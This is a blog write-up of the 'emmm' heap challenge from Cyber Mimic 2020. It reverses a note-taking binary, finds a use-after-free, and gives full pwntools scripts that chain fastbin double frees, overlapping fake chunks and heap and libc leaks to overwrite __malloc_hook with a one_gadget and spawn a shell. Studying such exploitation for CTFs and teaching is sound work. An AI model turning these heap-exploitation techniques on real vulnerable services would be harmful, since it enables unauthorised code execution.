+++
title = "Cyber Mimic 2020 emmm Writeup"
date = "2020-06-21"
+++

This is yet another challenge that we solved during this weekend's Cyber Mimic 2020 and the current post is supposedly the intended solution for this challenge.

## TL;DR OF THE CHALLENGE BINARY

We've been given a standard *x86 64-bit* Dynamically linked binary along with **glibc 2.23** to begin with.

Here's what *checksec* has to say.

```py
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL

```

## REVERSING

Firing it up in *Ghidra* , we see that the binary is a standard CTF-style menu driven binary with the following options.

1. **Add Note** -
    * Checks if the *allocated_count* is less than **0x15** and then finds an empty slot for our allocation by iterating through the bss table corresponding to allocated chunks.
    * It then calls **malloc** of **0x10** and then adds it to the corresponding slot in the bss table.
    * **Size** is further requested which is checked for being less than **0x2ff** and then another malloc of **size** is called whose address is stored in the first offset of the **0x10** chunk.
    * **size** bytes are read into this chunk of user defined size and then the size is stored at the second offset of our **0x10** chunk followed by an increment in **allocated\_count**.


```c
void add(void)

{
  long lVar1;
  void **ppvVar2;
  int iVar3;
  long lVar4;
  void *pvVar5;
  long lVar6;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  lVar4 = 0;
  if (allocated_count < 0x15) {
    do {
      lVar6 = (long)(int)lVar4;
      if ((&header)[lVar4 * 8] == 0) break;
      lVar4 = lVar4 + 1;
    } while (lVar4 != 0x15);
    pvVar5 = malloc(0x10);
    *(void **)(&header + lVar6 * 8) = pvVar5;
    __printf_chk(1,"Size:");
    iVar3 = get_int();
    if (0x2ff < iVar3 - 1U) {
      puts("Too large!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    ppvVar2 = (void **)(&header)[lVar6 * 8];
    pvVar5 = malloc((long)iVar3);
    *ppvVar2 = pvVar5;
    if (*(long *)(&header)[lVar6 * 8] == 0) {
      puts("malloc error");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    __printf_chk(1,"Note:");
    read(0,*(void **)(&header)[lVar6 * 8],(long)iVar3);
    allocated_count = allocated_count + 1;
    *(int *)((&header)[lVar6 * 8] + 8) = iVar3;
    if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
      puts("Success~");
      return;
    }
  }
  else {
    if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
      return;
    }
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

2. **Delete Note** -
    * Checks if **allocated\_count** is less than **0x15** , asks for *unsigned int* **index** and checks if the bss entry corresponding to the requested **index** is NULL or not.
    * If not , then it prints the content of the note.
    * Finally it frees the **header** chunk of size **0x10** , *without nulling out the bss entry*.

```c
void delete(void)

{
  long lVar1;
  uint uVar2;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  if (allocated_count < 0x15) {
    __printf_chk(1,"Index:");
    uVar2 = get_int();
    if (uVar2 < 0x15) {
      if ((undefined8 *)(&header)[(long)(int)uVar2 * 8] != (undefined8 *)0x0) {
        __printf_chk(1,"You will free: %s .\n",*(undefined8 *)(&header)[(long)(int)uVar2 * 8]);
        free((void *)(&header)[(long)(int)uVar2 * 8]);
        if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
          puts("Success~");
          return;
        }
        goto LAB_5555555552d5;
      }
    }
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
LAB_5555555552d5:
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

3. **Show Note** -
    * This option talks about showing some kind of secret initially.
    * Checks if a flag is null or not.
    * If found null , it goes about asking *unsigned int* length , checks if length is **0xffffffff** and if **length** is found to be less than **0x17** , it then asks for **input**.
    * Then , it does some math on the global variable **secret** using the *long* type input that we just passed.
    * It then prints out 0 or 1 depending on condition that is being invoked **input + secret < calc** where *calc* is **calc = input + secret + input * -4** and it does all this in a while loop which executes for **0xff** times.
    * After breaking out of the *do while* , it sets a flag in the bss.
    * The function then asks us for a *guess* which is compared with the *secret* value.
    * If we pass the comparision , the function further asks for a *gender* by choosing 1 or 2.

> Honestly I'm not sure if this function is like *really* useful to us at all at the moment :/

Anyways , here's the decompilation.

```c
void Show_Note(void)

{
  uint len;
  long input;
  long lVar1;
  long calc;
  int iVar2;
  long in_FS_OFFSET;
  int local_24;
  long local_20;
  
  iVar2 = 0xff;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  puts("If you can guess my secret, I will show something for you.");
  if (secret_bit == 0) {
    do {
      __printf_chk(1,"length:");
      len = get_int();
      if (len == 0xffffffff) {
        puts("You must have already guess my secret!");
        break;
      }
      if (0x17 < len - 1) {
        puts("You don\'t know me!");
                    /* WARNING: Subroutine does not return */
        exit(-1);
      }
      __printf_chk(1,"input:");
      input = get_int2((ulong)len);
      calc = input + secret + input * -4;
      __printf_chk(1,"output:%d\n",(ulong)(input + secret < calc),calc);
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    secret_bit = 1;
  }
  __printf_chk(1,"Your guess:");
  lVar1 = get_int2(0x18);
  if (lVar1 != secret) {
    puts("bye~");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  puts("Congratulations!");
  puts("Please choose your gender. [1:boy] [2:girl]");
  __isoc99_scanf(&DAT_555555555621,&local_24);
  if (local_24 == 1) {
    puts("You are a clever boy!");
  }
  else {
    if (local_24 == 2) {
      puts("You are a clever girl!");
    }
    else {
      puts("You are a ???");
    }
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Now that we have reversed the entire binary , let's get started with hijacking the control flow :).

## EXPLOIT DEVELOPMENT

Well , the bug is clearly evident in the **Delete Note** function which is the infamous **Use After Free**. Hence Heap Leak should be trivial.

### Heap Leak

So we can free the header chunk only and probably double free it too. Hmm, sounds cool for getting our heap leak.

```py
from pwn import *
import sys

HOST = '172.35.29.41'
PORT = 9999

if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./pwn',env = {"LD_PRELOAD" : "./libc.so.6"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

def add(size,note):
    io.sendlineafter("Choice >>","1")
    io.sendlineafter("Size:",str(size))
    io.sendafter("Note:",str(note))

def free(idx):
    io.sendlineafter("Choice >>","2")
    io.sendlineafter("Index:",str(idx))

if __name__=="__main__":
    add(0x70,'0000')
    add(0x70,'1111')
    add(0x70,'2222')
    free(1)
    free(2)
    free(0)
    add(0x10,'\xf0')
    gdb.attach(io)
    free(3)
    reu('will free: ')
    heap_base = u64(re(6) + '\x00'*2) - 0xf0
    log.info("heap @ " + hex(heap_base))
    io.interactive()

```

The procedure in which we got leak was -> 

> free(1), free(2) and then free(0)

This causes fastbin list to be created in the way **0->2->1** due to the **LIFO** property of fastbins
{: .notice}

Now when we add another note of size **0x10** , initially it takes out chunk 0 from the fastbins for initialising the header , and then it takes out chunk 2 as even user requested size is **0x10** itself which is the cause of heap leak. 

From here , we need to analyze memory to get a better perspective of the exploit.


```sh
0x555555758000:	0x0000000000000000	0x0000000000000021 -> Chunk at idx 0
0x555555758010:	0x0000555555758150	0x0000000000000010
0x555555758020:	0x0000000000000000	0x0000000000000081
0x555555758030:	0x0000000030303030	0x0000000000000000
0x555555758040:	0x0000000000000000	0x0000000000000000
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x5555557580a0:	0x0000000000000000	0x0000000000000021 -> Chunk at idx 1
0x5555557580b0:	0x0000000000000000	0x0000000000000070
0x5555557580c0:	0x0000000000000000	0x0000000000000081
0x5555557580d0:	0x0000000031313131	0x0000000000000000
0x5555557580e0:	0x0000000000000000	0x0000000000000000
0x5555557580f0:	0x0000000000000000	0x0000000000000000
0x555555758100:	0x0000000000000000	0x0000000000000000
0x555555758110:	0x0000000000000000	0x0000000000000000
0x555555758120:	0x0000000000000000	0x0000000000000000
0x555555758130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x555555758140:	0x0000000000000000	0x0000000000000021 -> Chunk at idx 2 , from which we just leaked heap
0x555555758150:	0x00005555557580f0	0x0000000000000070
0x555555758160:	0x0000000000000000	0x0000000000000081
0x555555758170:	0x0000000032323232	0x0000000000000000
0x555555758180:	0x0000000000000000	0x0000000000000000
0x555555758190:	0x0000000000000000	0x0000000000000000
0x5555557581a0:	0x0000000000000000	0x0000000000000000
0x5555557581b0:	0x0000000000000000	0x0000000000000000
0x5555557581c0:	0x0000000000000000	0x0000000000000000


```

### Pursuing the Libc

**0x21** size is just a fastbin chunk , how do we expect to get libc leak from a fastbin chunk??

If we can somehow corrupt the size of this 0x21 chunk with a small bin size , we can get our beloved libc. But how do we do that?

The answer to that could be creating **overlapping chunks**.

We use our friend **double free** and overwrite fd of a free chunk with our fake chunk's address which can yield our fake chunk overlapping with another chunk whose size we can overwrite.
{: .notice}

If that didn't hit a nerve , it will soon do :).

Let's craft a fake chunk inside of one of our allocated chunks only , some modifications to be made too :)

```py

if __name__=="__main__":
    add(0x70,'0000')
    add(0x70,'1111')
    add(0x70,'2'*0x60 + p64(0) + p64(0x21))
    add(0x70,'3333')
    free(1)
    free(2)
    free(0)
    add(0x10,'\xf0') #Chunk 4
    free(4)
    reu('will free: ')
    heap_base = u64(re(6) + '\x00'*2) - 0xf0
    log.info("heap @ " + hex(heap_base))

```

Now our fake chunk should reside in the memory.

```sh
0x555555758000:	0x0000000000000000	0x0000000000000021 -> Chunk 0
0x555555758010:	0x00005555557580a0	0x0000000000000010
0x555555758020:	0x0000000000000000	0x0000000000000081
0x555555758030:	0x0000000030303030	0x0000000000000000
0x555555758040:	0x0000000000000000	0x0000000000000000
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x5555557580a0:	0x0000000000000000	0x0000000000000021 -> Chunk 1
0x5555557580b0:	0x0000555555758000	0x0000000000000070
0x5555557580c0:	0x0000000000000000	0x0000000000000081
0x5555557580d0:	0x0000000031313131	0x0000000000000000
0x5555557580e0:	0x0000000000000000	0x0000000000000000
0x5555557580f0:	0x0000000000000000	0x0000000000000000
0x555555758100:	0x0000000000000000	0x0000000000000000
0x555555758110:	0x0000000000000000	0x0000000000000000
0x555555758120:	0x0000000000000000	0x0000000000000000
0x555555758130:	0x0000000000000000	0x0000000000000000
gdb-peda$ 
0x555555758140:	0x0000000000000000	0x0000000000000021 -> Chunk 2 , from which we leaked heap
0x555555758150:	0x00005555557580f0	0x0000000000000070 
0x555555758160:	0x0000000000000000	0x0000000000000081
0x555555758170:	0x3232323232323232	0x3232323232323232
0x555555758180:	0x3232323232323232	0x3232323232323232
0x555555758190:	0x3232323232323232	0x3232323232323232
0x5555557581a0:	0x3232323232323232	0x3232323232323232
0x5555557581b0:	0x3232323232323232	0x3232323232323232
0x5555557581c0:	0x3232323232323232	0x3232323232323232
0x5555557581d0:	0x0000000000000000	0x0000000000000021 -> Fake chunk
gdb-peda$ 
0x5555557581e0:	0x0000000000000000	0x0000000000000021 -> Chunk 3 whose size we are interested in corrupting
0x5555557581f0:	0x0000555555758210	0x0000000000000070
0x555555758200:	0x0000000000000000	0x0000000000000081
0x555555758210:	0x0000000033333333	0x0000000000000000
0x555555758220:	0x0000000000000000	0x0000000000000000
0x555555758230:	0x0000000000000000	0x0000000000000000
0x555555758240:	0x0000000000000000	0x0000000000000000
0x555555758250:	0x0000000000000000	0x0000000000000000
0x555555758260:	0x0000000000000000	0x0000000000000000
0x555555758270:	0x0000000000000000	0x0000000000000000

```

After all this , our fastbin now just  **4->1** , call **double free** on chunk 1 to re-add it to fastbin.

So our fastbin should look like , **1->4->1** with which we can edit the fd of our chunk 1 and point it to our fake chunk and get our fake chunk after that.

```py
    free(1) #Double Free here
```

If we call **add** now ,it will take our chunk **1** as head which we dont want. so let's free chunk 3 before we call malloc.

```py
    free(3)
```

Now fastbin should be like **3->1->4->1**. Subsequent call to **Add Note** should take chunk **3** for header and chunk **1** for note.

We can overwrite the fd with our fake chunk's addr

```py
    fake_chunk = heap_base + 0x1d0
    add(0x10,p64(fake_chunk)) #5
```

Our fastbin looks like this now , **4->1->fake\_chunk**. Let's add one more chunk to fastbin as we need **Add note** to give our fake chunk for writing our data not the header part.

```py
    free(2)
```

Now we have **2->4->1->fake\_chunk** , two more times **Add note** should give us our fake chunk for writing

```py
    add(0x10,'6666')
    #We get our overlapping chunk
    add(0x10,'a'*0x10 + p64(0) + p64(0xe0)) #Faking header's size to small bin
```

We finally can free our small bin chunk to get libc leak.

We have to recall that for free , the chunk which is next in memory should also be set appropriately, but here we have the top chunk and hence we face the **corrupted size or Double Free** SIGABART.

Ah Snap! , we have to modify our exploit a bit more to move forward , let us add 2 more chunks in the starting so that we dont face this issue.

```py
if __name__=="__main__":
    add(0x70,'0000')
    add(0x70,'1111')
    add(0x70,'2222')
    add(0x70,'3'*0x60 + p64(0) + p64(0x21)) #Contains our fake chunk
    add(0x90,'4444')
    add(0xd0,'5555')                        #This is to prevent errors in freeing the small bin
    
    free(1)
    free(2)          # 2->1
    free(0)          # 0->2->1

    #Add chunk number 6
    add(0x10,'\xf0') #which takes away 0th chunk for header and chunk 2 for note
    
    #Send chunk 6 to fastbin and thus get heap leak
    free(6)    # 6->1

    #Get heap Leak
    reu('will free: ')
    heap_base = u64(re(6) + '\x00'*2) - 0xf0
    log.info("heap @ " + hex(heap_base))

    #Now double free chunk 1
    free(1)         # 1->6->1

    #free another chunk to ensure that we get our chunk 1 as note and not the header
    free(3)         # 3->1->6->1 

    fake_chunk = heap_base + 0x270

    #Adding Chunk number 7
    add(0x10,p64(fake_chunk))   #This takes chunk 3 as header and chunk 1 taken as note , its fd overwritten with fake chunk , 
                                # 6->1->fake_chunk

    #Free Another chunk such that fake chunk is recieved as note and not as header
    free(2)    # 2->6->1->fake_chunk

    #Next add , chunk number 8, is just for removing 2 chunks from fastbin
    add(0x10,'8888') #chunk 8 , which takes chunk 2 as header and chunk 6 as its note, now fastbin is left with => 1->fake_chunk

    #We get our overlapping chunk
    add(0x10,p64(0) + p64(0xe1)) # chunk number 9, Faking header's size to small bin , chunk 1 taken as header and fake_chunk returned as overlapping chunk

    #Finally free our small bin to populate its fd and bk with libc
    free(4)

    #Add chunk number 10
    add(0x10,'\x78') #Chunk 10, returned from unsorted bin having fd and bk as libc

    #Finally free it to print libc 
    free(10)
    reu('will free: ')
    libc_base = u64(re(6) + '\x00'*2)
    log.info('libc_base @ ' + hex(libc_base)) - 0x3c4b78
    gdb.attach(io)
    io.interactive()

```

Phew! ,Getting libc was a little tideous , but now we can do the same and get a fastbin of 0x70 size chunk to overwrite **malloc\_hook** with **one\_gadget**.

I changed the script a little bit due to a lot of reasons , one of them being running out of allocations.

So now the plan is to  fake two 0x71 fastbins so that we can double free yet again and write to the misaligned region near our beloved **\__malloc\_hook** and finally get shell.

Also note that I used double free as a medium of calling malloc as the constraints of **one\_gadget** were not satisfying in normal malloc call.

Here's the script by the way.

```py
from pwn import *
import sys

HOST = '172.35.29.41'
PORT = 9999

if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./pwn',env = {"LD_PRELOAD" : "./libc.so.6"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

def add(size,note):
    io.sendlineafter("Choice >>","1")
    io.sendlineafter("Size:",str(size))
    io.sendafter("Note:",str(note))

def free(idx):
    io.sendlineafter("Choice >>","2")
    io.sendlineafter("Index:",str(idx))

if __name__=="__main__":
    add(0x70,'0'*0x60 + p64(0) + p64(0x21))
    add(0x70,'1'*0x40 + p64(0) + p64(0x71) + '1'*0x10  + p64(0) + p64(0x21))
    add(0x90,p64(0) + p64(0x71) + '2'*0x30 + p64(0) + p64(0x71) + p64(0) + p64(0x21))
    #add(0x90,'3'*0x10 + p64(0) + p64(0xe1) + '1'*0x20 + p64(0) + p64(0x71))
    add(0xd0,'3333')
    free(1)
    free(3)    # 3->1
    free(0)    # 0->2->1
    add(0x10,'\xf0') #chunk number 4, which takes away 0th chunk for header and chunk 2 for note
    free(4)    # 4->1
    reu('will free: ')
    heap_base = u64(re(6) + '\x00'*2) - 0xf0
    log.info("heap @ " + hex(heap_base))
    free(1) #Double Free --  1->4->1
    free(3) # 3->1->4->1 
    fake_chunk = heap_base + 0x130
    fake_chunk_2 = heap_base + 0x90
    add(0x10,p64(fake_chunk)) #chunk number 5 , which takes chunk 3 as header and chunk 1 taken as note , its fd overwritten with fake chunk , => 4->1->fake_chunk
    free(2)    # 2->4->1->fake_chunk
    add(0x10,'\xf0') #chunk 6 , which takes chunk 2 as header and chunk 5 as its note, now fastbin left with => 1->fake_chunk
    #We get our overlapping chunk
    add(0x10,p64(0) + p64(0xe1)) # chunk number 7, Faking header's size to small bin , chunk 1 taken as header and fake_chunk returned as overlapping chunk
    free(2)
    add(0x10,'\x78') #Chunk 8, returned from unsorted bin having fd and bk as libc
    free(8)
    reu('will free: ')
    libc_base = u64(re(6) + '\x00'*2) - 0x3c4b78
    log.info('libc_base @ ' + hex(libc_base))
    one_gadget = libc_base + 0xf02a4
    target = libc_base + 0x3c4aed

    #Fake 0x71 size 2 chunks
    free(0) #0
    free(1) #1->0
    free(0) #0->1->0
    free(2) #2->0->1->0
    add(0x10,p64(fake_chunk_2)) #1->0->fake_chunk2
    free(2) #2->1->0->fake_chunk2
    add(0x10,'\xf0') #0->fake_chunk2
    add(0x10,p64(0) + p64(0x71)) 

    free(0) #0
    free(3) #3->0
    free(0) #0->3->0
    free(2) #2->0->3->0
    add(0x10,p64(fake_chunk)) #3->0->fake_chunk
    free(2) #2->3->0->fake_chunk
    add(0x10,'\xf0')
    add(0x10,p64(0) + p64(0x71))

    #free 0x71 chunks , double free
    free(2) #2
    free(1) #1->2
    free(2) #2->1->2
    add(0x60,p64(target)) #1->4->target
    add(0x60,p64(target)) #4->target
    add(0x60,p64(target)) #target->Null
    add(0x60,'a'*19 + p64(one_gadget)) #Getting the target chunk for writing one_gadget
    free(0)
    gdb.attach(io)
    free(0)
    io.interactive()

```

## CONCLUSION

All in All , this challenge provides a really good way to learn about fastbin corruption and creating overlapping chunks in memory.


